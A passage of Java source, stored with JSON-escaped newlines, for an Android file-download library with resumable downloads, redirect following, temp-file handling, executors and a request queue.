deliverCancelEvent();\n\t        Utils.deleteTempFileAndDatabaseEntryInBackground(Utils.getTempPath(dirPath, fileName), downloadId);\n\t    }\n\n    private void finish() {\n\t        destroy();\n\t        DownloadRequestQueue.getInstance().finish(this);\n\t    }\n\n    private void destroy() {\n\t        this.onProgressListener \u003d null;\n\t        this.onDownloadListener \u003d null;\n\t        this.onStartOrResumeListener \u003d null;\n\t        this.onPauseListener \u003d null;\n\t        this.onCancelListener \u003d null;\n\t    }\n\n    private int getReadTimeoutFromConfig() {\n\t        return ComponentHolder.getInstance().getReadTimeout();\n\t    }\n\n    private int getConnectTimeoutFromConfig() {\n\t        return ComponentHolder.getInstance().getConnectTimeout();\n\t    }\n\n}\n\npublic static class DownloadRequestBuilder implements RequestBuilder {\n    String url;\n    String dirPath;\n    String fileName;\n    Priority priority \u003d Priority.MEDIUM;\n    Object tag;\n    int readTimeout;\n    int connectTimeout;\n    String userAgent;\n    HashMap\u003cString, List\u003cString\u003e\u003e headerMap;\n    public DownloadRequestBuilder(String url, String dirPath, String fileName) {\n\t        this.url \u003d url;\n\t        this.dirPath \u003d dirPath;\n\t        this.fileName \u003d fileName;\n\t    }\n    @Override\n    public DownloadRequestBuilder setHeader(String name, String value) {\n\t        if (headerMap \u003d\u003d null) {\n\t\t            headerMap \u003d new HashMap\u003c\u003e();\n\t\t        }\n\t        List\u003cString\u003e list \u003d headerMap.get(name);\n\t        if (list \u003d\u003d null) {\n\t\t            list \u003d new ArrayList\u003c\u003e();\n\t\t            headerMap.put(name, list);\n\t\t        }\n\t        if (!list.contains(value)) {\n\t\t            list.add(value);\n\t\t        }\n\t        return this;\n\t    }\n    @Override\n    public DownloadRequestBuilder setPriority(Priority priority) {\n\t        this.priority \u003d priority;\n\t        return this;\n\t    }\n    @Override\n    public DownloadRequestBuilder setTag(Object tag) {\n\t        this.tag \u003d tag;\n\t        return this;\n\t    }\n    @Override\n    public DownloadRequestBuilder setReadTimeout(int readTimeout) {\n\t        this.readTimeout \u003d readTimeout;\n\t        return this;\n\t    }\n    @Override\n    public DownloadRequestBuilder setConnectTimeout(int connectTimeout) {\n\t        this.connectTimeout \u003d connectTimeout;\n\t        return this;\n\t    }\n    @Override\n    public DownloadRequestBuilder setUserAgent(String userAgent) {\n\t        this.userAgent \u003d userAgent;\n\t        return this;\n\t    }\n    public DownloadRequest build() {\n\t        return new DownloadRequest(this);\n\t    }\n}\n\npublic static interface RequestBuilder {\n    RequestBuilder setHeader(String name, String value);\n    RequestBuilder setPriority(Priority priority);\n    RequestBuilder setTag(Object tag);\n    RequestBuilder setReadTimeout(int readTimeout);\n    RequestBuilder setConnectTimeout(int connectTimeout);\n    RequestBuilder setUserAgent(String userAgent);\n}\n\npublic static final class Utils {\n    private final static int MAX_REDIRECTION \u003d 10;\n    private Utils() {\n\t    }\n    public static String getPath(String dirPath, String fileName) {\n\t        return dirPath + java.io.File.separator + fileName;\n\t    }\n    public static String getTempPath(String dirPath, String fileName) {\n\t        return getPath(dirPath, fileName) + \".temp\";\n\t    }\n    public static void renameFileName(String oldPath, String newPath) throws java.io.IOException {\n\t        final java.io.File oldFile \u003d new java.io.File(oldPath);\n\t        try {\n\t\t            final java.io.File newFile \u003d new java.io.File(newPath);\n\t\t            if (newFile.exists()) {\n\t\t\t                if (!newFile.delete()) {\n\t\t\t\t                    throw new java.io.IOException(\"Deletion Failed\");\n\t\t\t\t                }\n\t\t\t            }\n\t\t            if (!oldFile.renameTo(newFile)) {\n\t\t\t                throw new java.io.IOException(\"Rename Failed\");\n\t\t\t            }\n\t\t        } finally {\n\t\t            if (oldFile.exists()) {\n\t\t\t                oldFile.delete();\n\t\t\t            }\n\t\t        }\n\t    }\n\n    public static void deleteTempFileAndDatabaseEntryInBackground(final String path, final int downloadId) {\n\t        Core.getInstance().getExecutorSupplier().forBackgroundTasks()\n\t                .execute(new Runnable() {\n\t\t                    @Override\n\t\t                    public void run() {\n\t\t\t                        ComponentHolder.getInstance().getDbHelper().remove(downloadId);\n\t\t\t                        java.io.File file \u003d new java.io.File(path);\n\t\t\t                        if (file.exists()) {\n\t\t\t\t                            //noinspection ResultOfMethodCallIgnored\n\t\t\t\t                            file.delete();\n\t\t\t\t                        }\n\t\t\t                    }\n\t\t                });\n\t    }\n\n    public static void deleteUnwantedModelsAndTempFiles(final int days) {\n\t        Core.getInstance().getExecutorSupplier().forBackgroundTasks()\n\t                .execute(new Runnable() {\n\t\t                    @Override\n\t\t                    public void run() {\n\t\t\t                        List\u003cDownloadModel\u003e models \u003d ComponentHolder.getInstance()\n\t\t\t                                .getDbHelper()\n\t\t\t                                .getUnwantedModels(days);\n\t\t\t                        if (models !\u003d null) {\n\t\t\t\t                            for (DownloadModel model : models) {\n\t\t\t\t\t                                final String tempPath \u003d getTempPath(model.getDirPath(), model.getFileName());\n\t\t\t\t\t                                ComponentHolder.getInstance().getDbHelper().remove(model.getId());\n\t\t\t\t\t                                java.io.File file \u003d new java.io.File(tempPath);\n\t\t\t\t\t                                if (file.exists()) {\n\t\t\t\t\t\t                                    file.delete();\n\t\t\t\t\t\t                                }\n\t\t\t\t\t                            }\n\t\t\t\t                        }\n\t\t\t                    }\n\t\t                });\n\t    }\n\n    public static int getUniqueId(String url, String dirPath, String fileName) {\n\t        String string \u003d url + java.io.File.separator + dirPath + java.io.File.separator + fileName;\n\t        byte[] hash;\n\t        try {\n\t\t            hash \u003d java.security.MessageDigest.getInstance(\"MD5\").digest(string.getBytes(\"UTF-8\"));\n\t\t        } catch (java.security.NoSuchAlgorithmException e) {\n\t\t            throw new RuntimeException(\"NoSuchAlgorithmException\", e);\n\t\t        } catch (java.io.UnsupportedEncodingException e) {\n\t\t            throw new RuntimeException(\"UnsupportedEncodingException\", e);\n\t\t        }\n\t        StringBuilder hex \u003d new StringBuilder(hash.length * 2);\n\t\n\t        for (byte b : hash) {\n\t\t            if ((b \u0026 0xFF) \u003c 0x10) hex.append(\"0\");\n\t\t            hex.append(Integer.toHexString(b \u0026 0xFF));\n\t\t        }\n\t        return hex.toString().hashCode();\n\t\n\t    }\n    public static HttpClient getRedirectedConnectionIfAny(HttpClient httpClient,\n                                                          DownloadRequest request)\n            throws java.io.IOException, IllegalAccessException {\n\t        int redirectTimes \u003d 0;\n\t        int code \u003d httpClient.getResponseCode();\n\t        String location \u003d httpClient.getResponseHeader(\"Location\");\n\t        while (isRedirection(code)) {\n\t\t            if (location \u003d\u003d null) {\n\t\t\t                throw new IllegalAccessException(\"Location is null\");\n\t\t\t            }\n\t\t            httpClient.close();\n\t\t            request.setUrl(location);\n\t\t            httpClient \u003d ComponentHolder.getInstance().getHttpClient();\n\t\t            httpClient.connect(request);\n\t\t            code \u003d httpClient.getResponseCode();\n\t\t            location \u003d httpClient.getResponseHeader(\"Location\");\n\t\t            redirectTimes++;\n\t\t            if (redirectTimes \u003e\u003d MAX_REDIRECTION) {\n\t\t\t                throw new IllegalAccessException(\"Max redirection done\");\n\t\t\t            }\n\t\t        }\n\t        return httpClient;\n\t    }\n    private static boolean isRedirection(int code) {\n\t        return code \u003d\u003d java.net.HttpURLConnection.HTTP_MOVED_PERM\n\t                || code \u003d\u003d java.net.HttpURLConnection.HTTP_MOVED_TEMP\n\t                || code \u003d\u003d java.net.HttpURLConnection.HTTP_SEE_OTHER\n\t                || code \u003d\u003d java.net.HttpURLConnection.HTTP_MULT_CHOICE\n\t                || code \u003d\u003d Constants.HTTP_TEMPORARY_REDIRECT\n\t                || code \u003d\u003d Constants.HTTP_PERMANENT_REDIRECT;\n\t    }\n}\n\n\npublic static class Core {\n    private static Core instance \u003d null;\n    private final ExecutorSupplier executorSupplier;\n    private Core() {\n\t        this.executorSupplier \u003d new DefaultExecutorSupplier();\n\t    }\n    public static Core getInstance() {\n\t        if (instance \u003d\u003d null) {\n\t\t            synchronized (Core.class) {\n\t\t\t                if (instance \u003d\u003d null) {\n\t\t\t\t                    instance \u003d new Core();\n\t\t\t\t                }\n\t\t\t            }\n\t\t        }\n\t        return instance;\n\t    }\n    public ExecutorSupplier getExecutorSupplier() {\n\t        return executorSupplier;\n\t    }\n    public static void shutDown() {\n\t        if (instance !\u003d null) {\n\t\t            instance \u003d null;\n\t\t        }\n\t    }\n}\n\n\npublic static class PriorityThreadFactory implements java.util.concurrent.ThreadFactory {\n    private final int mThreadPriority;\n    PriorityThreadFactory(int threadPriority) {\n\t        mThreadPriority \u003d threadPriority;\n\t    }\n    @Override\n    public Thread newThread(final Runnable runnable) {\n\t        Runnable wrapperRunnable \u003d new Runnable() {\n\t\t            @Override\n\t\t            public void run() {\n\t\t\t                try {\n\t\t\t\t                    android.os.Process.setThreadPriority(mThreadPriority);\n\t\t\t\t                } catch (Throwable ignored) {\n\t\t\t\t\n\t\t\t\t                }\n\t\t\t                runnable.run();\n\t\t\t            }\n\t\t        };\n\t        return new Thread(wrapperRunnable);\n\t    }\n}\npublic static class MainThreadExecutor implements java.util.concurrent.Executor {\n    private final Handler handler \u003d new Handler(Looper.getMainLooper());\n    @Override\n    public void execute(Runnable runnable) {\n\t        handler.post(runnable);\n\t    }\n}\n\npublic static class DefaultExecutorSupplier implements ExecutorSupplier {\n    private static final int DEFAULT_MAX_NUM_THREADS \u003d 2 * Runtime.getRuntime().availableProcessors() + 1;\n    private final DownloadExecutor networkExecutor;\n    private final java.util.concurrent.Executor backgroundExecutor;\n    private final java.util.concurrent.Executor mainThreadExecutor;\n    DefaultExecutorSupplier() {\n\t        java.util.concurrent.ThreadFactory backgroundPriorityThreadFactory \u003d new PriorityThreadFactory(android.os.Process.THREAD_PRIORITY_BACKGROUND);\n\t        networkExecutor \u003d new DownloadExecutor(DEFAULT_MAX_NUM_THREADS, backgroundPriorityThreadFactory);\n\t        backgroundExecutor \u003d java.util.concurrent.Executors.newSingleThreadExecutor();\n\t        mainThreadExecutor \u003d new MainThreadExecutor();\n\t    }\n    @Override\n    public DownloadExecutor forDownloadTasks() {\n\t        return networkExecutor;\n\t    }\n    @Override\n    public java.util.concurrent.Executor forBackgroundTasks() {\n\t        return backgroundExecutor;\n\t    }\n    @Override\n    public java.util.concurrent.Executor forMainThreadTasks() {\n\t        return mainThreadExecutor;\n\t    }\n}\n\npublic static interface ExecutorSupplier {\n    DownloadExecutor forDownloadTasks();\n    java.util.concurrent.Executor forBackgroundTasks();\n    java.util.concurrent.Executor forMainThreadTasks();\n}\n\n\npublic static class FileDownloadRandomAccessFile implements FileDownloadOutputStream {\n    private final java.io.BufferedOutputStream out;\n    private final java.io.FileDescriptor fd;\n    private final java.io.RandomAccessFile randomAccess;\n    private FileDownloadRandomAccessFile(java.io.File file) throws java.io.IOException {\n\t        randomAccess \u003d new java.io.RandomAccessFile(file, \"rw\");\n\t        fd \u003d randomAccess.getFD();\n\t        out \u003d new java.io.BufferedOutputStream(new java.io.FileOutputStream(randomAccess.getFD()));\n\t    }\n    @Override\n    public void write(byte[] b, int off, int len) throws java.io.IOException {\n\t        out.write(b, off, len);\n\t    }\n    @Override\n    public void flushAndSync() throws java.io.IOException {\n\t        out.flush();\n\t        fd.sync();\n\t    }\n    @Override\n    public void close() throws java.io.IOException {\n\t        out.close();\n\t        randomAccess.close();\n\t    }\n    @Override\n    public void seek(long offset) throws java.io.IOException {\n\t        randomAccess.seek(offset);\n\t    }\n    @Override\n    public void setLength(long totalBytes) throws java.io.IOException {\n\t        randomAccess.setLength(totalBytes);\n\t    }\n    public static FileDownloadOutputStream create(java.io.File file) throws java.io.IOException {\n\t        return new FileDownloadRandomAccessFile(file);\n\t    }\n}\n\npublic static interface FileDownloadOutputStream {\n    void write(byte b[], int off, int len) throws java.io.IOException;\n    void flushAndSync() throws java.io.IOException;\n    void close() throws java.io.IOException;\n    void seek(long offset) throws java.io.IOException, IllegalAccessException;\n    void setLength(final long newLength) throws java.io.IOException, IllegalAccessException;\n}\npublic static class DownloadRunnable implements Runnable {\n    public final Priority priority;\n    public final int sequence;\n    public final DownloadRequest request;\n    DownloadRunnable(DownloadRequest request) {\n\t        this.request \u003d request;\n\t        this.priority \u003d request.getPriority();\n\t        this.sequence \u003d request.getSequenceNumber();\n\t    }\n    @Override\n    public void run() {\n\t        request.setStatus(Status.RUNNING);\n\t        DownloadTask downloadTask \u003d DownloadTask.create(request);\n\t        Response response \u003d downloadTask.run();\n\t        if (response.isSuccessful()) {\n\t\t            request.deliverSuccess();\n\t\t        } else if (response.isPaused()) {\n\t\t            request.deliverPauseEvent();\n\t\t        } else if (response.getError() !\u003d null) {\n\t\t            request.deliverError(response.getError());\n\t\t        } else if (!response.isCancelled()) {\n\t\t            request.deliverError(new Error());\n\t\t        }\n\t    }\n}\n\n\npublic static class SynchronousCall {\n    public final DownloadRequest request;\n    public SynchronousCall(DownloadRequest request) {\n\t        this.request \u003d request;\n\t    }\n    public Response execute() {\n\t        DownloadTask downloadTask \u003d DownloadTask.create(request);\n\t        return downloadTask.run();\n\t    }\n}\n\npublic static class ComponentHolder {\n    private final static ComponentHolder INSTANCE \u003d new ComponentHolder();\n    private int readTimeout;\n    private int connectTimeout;\n    private String userAgent;\n    private HttpClient httpClient;\n    private DbHelper dbHelper;\n    public static ComponentHolder getInstance() {\n\t        return INSTANCE;\n\t    }\n    public void init(Context context, PRDownloaderConfig config) {\n\t        this.readTimeout \u003d config.getReadTimeout();\n\t        this.connectTimeout \u003d config.getConnectTimeout();\n\t        this.userAgent \u003d config.getUserAgent();\n\t        this.httpClient \u003d config.getHttpClient();\n\t        this.dbHelper \u003d config.isDatabaseEnabled() ? new AppDbHelper(context) : new NoOpsDbHelper();\n\t        if (config.isDatabaseEnabled()) {\n\t\t            PRDownloader.cleanUp(30);\n\t\t        }\n\t    }\n    public int getReadTimeout() {\n\t        if (readTimeout \u003d\u003d 0) {\n\t\t            synchronized (ComponentHolder.class) {\n\t\t\t                if (readTimeout \u003d\u003d 0) {\n\t\t\t\t                    readTimeout \u003d Constants.DEFAULT_READ_TIMEOUT_IN_MILLS;\n\t\t\t\t                }\n\t\t\t            }\n\t\t        }\n\t        return readTimeout;\n\t    }\n    public int getConnectTimeout() {\n\t        if (connectTimeout \u003d\u003d 0) {\n\t\t            synchronized (ComponentHolder.class) {\n\t\t\t                if (connectTimeout \u003d\u003d 0) {\n\t\t\t\t                    connectTimeout \u003d Constants.DEFAULT_CONNECT_TIMEOUT_IN_MILLS;\n\t\t\t\t                }\n\t\t\t            }\n\t\t        }\n\t        return connectTimeout;\n\t    }\n    public String getUserAgent() {\n\t        if (userAgent \u003d\u003d null) {\n\t\t            synchronized (ComponentHolder.class) {\n\t\t\t                if (userAgent \u003d\u003d null) {\n\t\t\t\t                    userAgent \u003d Constants.DEFAULT_USER_AGENT;\n\t\t\t\t                }\n\t\t\t            }\n\t\t        }\n\t        return userAgent;\n\t    }\n    public DbHelper getDbHelper() {\n\t        if (dbHelper \u003d\u003d null) {\n\t\t            synchronized (ComponentHolder.class) {\n\t\t\t                if (dbHelper \u003d\u003d null) {\n\t\t\t\t                    dbHelper \u003d new NoOpsDbHelper();\n\t\t\t\t                }\n\t\t\t            }\n\t\t        }\n\t        return dbHelper;\n\t    }\n    public HttpClient getHttpClient() {\n\t        if (httpClient \u003d\u003d null) {\n\t\t            synchronized (ComponentHolder.class) {\n\t\t\t                if (httpClient \u003d\u003d null) {\n\t\t\t\t                    httpClient \u003d new DefaultHttpClient();\n\t\t\t\t                }\n\t\t\t            }\n\t\t        }\n\t        return httpClient.clone();\n\t    }\n}\n\n\npublic static class DownloadTask {\n    private static final int BUFFER_SIZE \u003d 1024 * 4;\n    private static final long TIME_GAP_FOR_SYNC \u003d 2000;\n    private static final long MIN_BYTES_FOR_SYNC \u003d 65536;\n    private final DownloadRequest request;\n    private ProgressHandler progressHandler;\n    private long lastSyncTime;\n    private long lastSyncBytes;\n    private java.io.InputStream inputStream;\n    private FileDownloadOutputStream outputStream;\n    private HttpClient httpClient;\n    private long totalBytes;\n    private int responseCode;\n    private String eTag;\n    private boolean isResumeSupported;\n    private String tempPath;\n    private DownloadTask(DownloadRequest request) {\n\t        this.request \u003d request;\n\t    }\n    static DownloadTask create(DownloadRequest request) {\n\t        return new DownloadTask(request);\n\t    }\n    Response run() {\n\t        Response response \u003d new Response();\n\t        if (request.getStatus() \u003d\u003d Status.CANCELLED) {\n\t\t            response.setCancelled(true);\n\t\t            return response;\n\t\t        } else if (request.getStatus() \u003d\u003d Status.PAUSED) {\n\t\t            response.setPaused(true);\n\t\t            return response;\n\t\t        }\n\t        try {\n\t\t            if (request.getOnProgressListener() !\u003d null) {\n\t\t\t                progressHandler \u003d new ProgressHandler(request.getOnProgressListener());\n\t\t\t            }\n\t\t            tempPath \u003d Utils.getTempPath(request.getDirPath(), request.getFileName());\n\t\t            java.io.File file \u003d new java.io.File(tempPath);\n\t\t            DownloadModel model \u003d getDownloadModelIfAlreadyPresentInDatabase();\n\t\t            if (model !\u003d null) {\n\t\t\t                if (file.exists()) {\n\t\t\t\t                    request.setTotalBytes(model.getTotalBytes());\n\t\t\t\t                    request.setDownloadedBytes(model.getDownloadedBytes());\n\t\t\t\t                } else {\n\t\t\t\t                    removeNoMoreNeededModelFromDatabase();\n\t\t\t\t                    request.setDownloadedBytes(0);\n\t\t\t\t                    request.setTotalBytes(0);\n\t\t\t\t                    model \u003d null;\n\t\t\t\t                }\n\t\t\t            }\n\t\t            httpClient \u003d ComponentHolder.getInstance().getHttpClient();\n\t\t            httpClient.connect(request);\n\t\t            if (request.getStatus() \u003d\u003d Status.CANCELLED) {\n\t\t\t                response.setCancelled(true);\n\t\t\t                return response;\n\t\t\t            } else if (request.getStatus() \u003d\u003d Status.PAUSED) {\n\t\t\t                response.setPaused(true);\n\t\t\t                return response;\n\t\t\t            }\n\t\t            httpClient \u003d Utils.getRedirectedConnectionIfAny(httpClient, request);\n\t\t            responseCode \u003d httpClient.getResponseCode();\n\t\t            eTag \u003d httpClient.getResponseHeader(Constants.ETAG);\n\t\t            if (checkIfFreshStartRequiredAndStart(model)) {\n\t\t\t                model \u003d null;\n\t\t\t            }\n\t\t            if (!isSuccessful()) {\n\t\t\t                Error error \u003d new Error();\n\t\t\t                error.setServerError(true);\n\t\t\t                response.setError(error);\n\t\t\t                return response;\n\t\t\t            }\n\t\t            setResumeSupportedOrNot();\n\t\t            totalBytes \u003d request.getTotalBytes();\n\t\t            if (!isResumeSupported) {\n\t\t\t                deleteTempFile();\n\t\t\t            }\n\t\t            if (totalBytes \u003d\u003d 0) {\n\t\t\t                totalBytes \u003d httpClient.getContentLength();\n\t\t\t                request.setTotalBytes(totalBytes);\n\t\t\t            }\n\t\t            if (isResumeSupported \u0026\u0026 model \u003d\u003d null) {\n\t\t\t                createAndInsertNewModel();\n\t\t\t            }\n\t\t            if (request.getStatus() \u003d\u003d Status.CANCELLED) {\n\t\t\t                response.setCancelled(true);\n\t\t\t                return response;\n\t\t\t            } else if (request.getStatus() \u003d\u003d Status.PAUSED) {\n\t\t\t                response.setPaused(true);\n\t\t\t                return response;\n\t\t\t            }\n\t\t            request.deliverStartEvent();\n\t\t            inputStream \u003d httpClient.getInputStream();\n\t\t            byte[] buff \u003d new byte[BUFFER_SIZE];\n\t\t            if (!file.exists()) {\n\t\t\t                if (file.getParentFile() !\u003d null \u0026\u0026 !file.getParentFile().exists()) {\n\t\t\t\t                    if (file.getParentFile().mkdirs()) {\n\t\t\t\t\t                        file.createNewFile();\n\t\t\t\t\t                    }\n\t\t\t\t                } else {\n\t\t\t\t                    file.createNewFile();\n\t\t\t\t                }\n\t\t\t            }\n\t\t            this.outputStream \u003d FileDownloadRandomAccessFile.create(file);\n\t\t            if (isResumeSupported \u0026\u0026 request.getDownloadedBytes() !\u003d 0) {\n\t\t\t                outputStream.seek(request.getDownloadedBytes());\n\t\t\t            }\n\t\t            if (request.getStatus() \u003d\u003d Status.CANCELLED) {\n\t\t\t                response.setCancelled(true);\n\t\t\t                return response;\n\t\t\t            } else if (request.getStatus() \u003d\u003d Status.PAUSED) {\n\t\t\t                response.setPaused(true);\n\t\t\t                return response;\n\t\t\t            }\n\t\t            do {\n\t\t\t                final int byteCount \u003d inputStream.read(buff, 0, BUFFER_SIZE);\n\t\t\t                if (byteCount \u003d\u003d -1) {\n\t\t\t\t                    break;\n\t\t\t\t                }\n\t\t\t                outputStream.write(buff, 0, byteCount);\n\t\t\t                request.setDownloadedBytes(request.getDownloadedBytes() + byteCount);\n\t\t\t                sendProgress();\n\t\t\t                syncIfRequired(outputStream);\n\t\t\t                if (request.getStatus() \u003d\u003d Status.CANCELLED) {\n\t\t\t\t                    response.setCancelled(true);\n\t\t\t\t                    return response;\n\t\t\t\t                } else if (request.getStatus() \u003d\u003d Status.PAUSED) {\n\t\t\t\t                    sync(outputStream);\n\t\t\t\t                    response.setPaused(true);\n\t\t\t\t                    return response;\n\t\t\t\t                }\n\t\t\t            } while (true);\n\t\t            final String path \u003d Utils.getPath(request.getDirPath(), request.getFileName());\n\t\t            Utils.renameFileName(tempPath, path);\n\t\t            response.setSuccessful(true);\n\t\t            if (isResumeSupported) {\n\t\t\t                removeNoMoreNeededModelFromDatabase();\n\t\t\t            }\n\t\t        } catch (java.io.IOException | IllegalAccessException e) {\n\t\t            if (!isResumeSupported) {\n\t\t\t                deleteTempFile();\n\t\t\t            }\n\t\t            Error error \u003d new Error();\n\t\t            error.setConnectionError(true);\n\t\t            response.setError(error);\n\t\t        } finally {\n\t\t            closeAllSafely(outputStream);\n\t\t        }\n\t        return response;\n\t    }\n    private void deleteTempFile() {\n\t        java.io.File file \u003d new java.io.File(tempPath);\n\t        if (file.exists()) {\n\t\t            file.delete();\n\t\t        }\n\t    }\n    private boolean isSuccessful() {\n\t        return responseCode \u003e\u003d java.net.HttpURLConnection.HTTP_OK\n\t                \u0026\u0026 responseCode \u003c java.net.HttpURLConnection.HTTP_MULT_CHOICE;\n\t    }\n    private void setResumeSupportedOrNot() {\n\t        isResumeSupported \u003d (responseCode \u003d\u003d java.net.HttpURLConnection.HTTP_PARTIAL);\n\t    }\n    private boolean checkIfFreshStartRequiredAndStart(DownloadModel model) throws java.io.IOException,\n            IllegalAccessException {\n\t        if (responseCode \u003d\u003d Constants.HTTP_RANGE_NOT_SATISFIABLE || isETagChanged(model)) {\n\t\t            if (model !\u003d null) {\n\t\t\t                removeNoMoreNeededModelFromDatabase();\n\t\t\t            }\n\t\t            deleteTempFile();\n\t\t            request.setDownloadedBytes(0);\n\t\t            request.setTotalBytes(0);\n\t\t            httpClient \u003d ComponentHolder.getInstance().getHttpClient();\n\t\t            httpClient.connect(request);\n\t\t            httpClient \u003d Utils.getRedirectedConnectionIfAny(httpClient, request);\n\t\t            responseCode \u003d httpClient.getResponseCode();\n\t\t            return true;\n\t\t        }\n\t        return false;\n\t    }\n    private boolean isETagChanged(DownloadModel model) {\n\t        return !(eTag \u003d\u003d null || model \u003d\u003d null || model.getETag() \u003d\u003d null)\n\t                \u0026\u0026 !model.getETag().equals(eTag);\n\t    }\n    private DownloadModel getDownloadModelIfAlreadyPresentInDatabase() {\n\t        return ComponentHolder.getInstance().getDbHelper().find(request.getDownloadId());\n\t    }\n    private void createAndInsertNewModel() {\n\t        DownloadModel model \u003d new DownloadModel();\n\t        model.setId(request.getDownloadId());\n\t        model.setUrl(request.getUrl());\n\t        model.setETag(eTag);\n\t        model.setDirPath(request.getDirPath());\n\t        model.setFileName(request.getFileName());\n\t        model.setDownloadedBytes(request.getDownloadedBytes());\n\t        model.setTotalBytes(totalBytes);\n\t        model.setLastModifiedAt(System.currentTimeMillis());\n\t        ComponentHolder.getInstance().getDbHelper().insert(model);\n\t    }\n    private void removeNoMoreNeededModelFromDatabase() {\n\t        ComponentHolder.getInstance().getDbHelper().remove(request.getDownloadId());\n\t    }\n    private void sendProgress() {\n\t        if (request.getStatus() !\u003d Status.CANCELLED) {\n\t\t            if (progressHandler !\u003d null) {\n\t\t\t                progressHandler\n\t\t\t                        .obtainMessage(Constants.UPDATE,\n\t\t\t                                new Progress(request.getDownloadedBytes(),\n\t\t\t                                        totalBytes)).sendToTarget();\n\t\t\t            }\n\t\t        }\n\t    }\n    private void syncIfRequired(FileDownloadOutputStream outputStream) {\n\t        final long currentBytes \u003d request.getDownloadedBytes();\n\t        final long currentTime \u003d System.currentTimeMillis();\n\t        final long bytesDelta \u003d currentBytes - lastSyncBytes;\n\t        final long timeDelta \u003d currentTime - lastSyncTime;\n\t        if (bytesDelta \u003e MIN_BYTES_FOR_SYNC \u0026\u0026 timeDelta \u003e TIME_GAP_FOR_SYNC) {\n\t\t            sync(outputStream);\n\t\t            lastSyncBytes \u003d currentBytes;\n\t\t            lastSyncTime \u003d currentTime;\n\t\t        }\n\t    }\n    private void sync(FileDownloadOutputStream outputStream) {\n\t        boolean success;\n\t        try {\n\t\t            outputStream.flushAndSync();\n\t\t            success \u003d true;\n\t\t        } catch (java.io.IOException e) {\n\t\t            success \u003d false;\n\t\t            e.printStackTrace();\n\t\t        }\n\t        if (success \u0026\u0026 isResumeSupported) {\n\t\t            ComponentHolder.getInstance().getDbHelper()\n\t\t                    .updateProgress(request.getDownloadId(),\n\t\t                            request.getDownloadedBytes(),\n\t\t                            System.currentTimeMillis());\n\t\t        }\n\t    }\n    private void closeAllSafely(FileDownloadOutputStream outputStream) {\n\t        if (httpClient !\u003d null) {\n\t\t            try {\n\t\t\t                httpClient.close();\n\t\t\t            } catch (Exception e) {\n\t\t\t                e.printStackTrace();\n\t\t\t            }\n\t\t        }\n\t        if (inputStream !\u003d null) {\n\t\t            try {\n\t\t\t                inputStream.close();\n\t\t\t            } catch (java.io.IOException e) {\n\t\t\t                e.printStackTrace();\n\t\t\t            }\n\t\t        }\n\t        try {\n\t\t            if (outputStream !\u003d null) {\n\t\t\t                try {\n\t\t\t\t                    sync(outputStream);\n\t\t\t\t                } catch (Exception e) {\n\t\t\t\t                    e.printStackTrace();\n\t\t\t\t                }\n\t\t\t            }\n\t\t\n\t\t        } finally {\n\t\t            if (outputStream !\u003d null)\n\t\t                try {\n\t\t\t                    outputStream.close();\n\t\t\t                } catch (java.io.IOException e) {\n\t\t\t                    e.printStackTrace();\n\t\t\t                }\n\t\t        }\n\t    }\n}\n\n\npublic static class DownloadRequestQueue {\n    private static DownloadRequestQueue instance;\n    private final Map\u003cInteger, DownloadRequest\u003e currentRequestMap;\n    private final java.util.concurrent.atomic.AtomicInteger sequenceGenerator;\n    private DownloadRequestQueue() {\n\t        currentRequestMap \u003d new java.util.concurrent.ConcurrentHashMap\u003c\u003e();\n\t        sequenceGenerator \u003d new java.util.concurrent.atomic.AtomicInteger();\n\t    }\n    public static void initialize() {\n\t        getInstance();\n\t    }\n    public static DownloadRequestQueue getInstance() {\n\t        if (instance \u003d\u003d null) {\n\t\t            synchronized (DownloadRequestQueue.class) {\n\t\t\t                if (instance \u003d\u003d null) {\n\t\t\t\t                    instance \u003d new DownloadRequestQueue();\n\t\t\t\t                }\n\t\t\t            }\n\t\t        }\n\t        return instance;\n\t    }\n    private int getSequenceNumber() {\n\t        return sequenceGenerator.incrementAndGet();\n\t    }\n    public void pause(int downloadId) {\n\t        DownloadRequest request \u003d currentRequestMap.get(downloadId);\n\t        if (request !\u003d null) {\n\t\t            request.setStatus(Status.PAUSED);\n\t\t        }\n\t    }\n    public void resume(int downloadId) {\n\t        DownloadRequest request \u003d currentRequestMap.get(downloadId);\n\t        if (request !\u003d null) {\n\t\t            request.setStatus(Status.QUEUED);\n\t\t            request.setFuture(Core.getInstance()\n\t\t                    .getExecutorSupplier()\n\t\t                    .forDownloadTasks()\n\t\t                    .submit(new DownloadRunnable(request)));\n\t\t        }\n\t    }\n    private void cancelAndRemoveFromMap(DownloadRequest request) {\n\t        if (request !\u003d null) {\n\t\t            request.cancel();\n\t\t            currentRequestMap.remove(request.getDownloadId());\n\t\t        }\n\t    }\n    public void cancel(int downloadId) {\n\t        DownloadRequest request \u003d currentRequestMap.get(downloadId);\n\t        cancelAndRemoveFromMap(request);\n\t    }\n    public void cancel(Object tag) {\n\t        for (Map.Entry\u003cInteger, DownloadRequest\u003e currentRequestMapEntry : currentRequestMap.entrySet()) {\n\t\t            DownloadRequest request \u003d currentRequestMapEntry.getValue();\n\t\t            if (request.getTag() instanceof String \u0026\u0026 tag instanceof String) {\n\t\t\t                final String tempRequestTag \u003d (String) request.getTag();\n\t\t\t                final String tempTag \u003d (String) tag;\n\t\t\t                if (tempRequestTag.equals(tempTag)) {\n\t\t\t\t                    cancelAndRemoveFromMap(request);\n\t\t\t\t                }\n\t\t\t            } else if (request.getTag().equals(tag)) {\n\t\t\t                cancelAndRemoveFromMap(request);\n\t\t\t            }\n\t\t        }\n\t    }\n    public void cancelAll() {\n\t        for (Map.Entry\u003cInteger, DownloadRequest\u003e currentRequestMapEntry : currentRequestMap.entrySet()) {\n\t\t            DownloadRequest request \u003d currentRequestMapEntry.getValue();\n\t\t            cancelAndRemoveFromMap(request);\n\t\t        }\n\t    }\n    public Status getStatus(int downloadId) {\n\t        DownloadRequest request \u003d currentRequestMap.get(downloadId);\n\t        if (request !\u003d null) {\n\t\t            return request.getStatus();\n\t\t        }\n\t        return Status.UNKNOWN;\n\t    }\n    public void addRequest(DownloadRequest request) {\n\t        currentRequestMap.put(request.getDownloadId(), request);\n\t        request.setStatus(Status.QUEUED);\n\t        request.setSequenceNumber(getSequenceNumber());\n\t        request.setFuture(Core.getInstance()\n\t                .getExecutorSupplier()\n\t                .forDownloadTasks()\n\t                .submit(new DownloadRunnable(request)));\n\t    }\n    public void finish(DownloadRequest request) {\n\t        currentRequestMap.remove(request.getDownloadId());\n\t    }\n}\n\n\npublic static class DownloadModel {\n    static final String ID \u003d \"id\";\n    static final String URL \u003d \"url\";\n    static final 